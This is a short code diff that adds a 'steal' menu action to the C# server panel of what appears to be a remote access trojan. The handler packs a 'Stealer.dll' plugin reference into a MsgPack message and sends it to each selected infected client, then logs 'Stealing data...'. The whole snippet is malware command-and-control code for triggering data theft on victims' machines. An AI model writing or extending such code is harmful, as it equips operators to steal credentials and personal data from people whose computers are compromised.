@@ -2296,5 +2296,24 @@ namespace Server
                 return;
             }
         }
+
+        private void stealToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Stealer.dll"));
+
+                foreach (Clients client in GetSelectedClients())
+                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                new HandleLogs().Addmsg("Stealing data...(May take long time.)", Color.Black);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
     }
 }
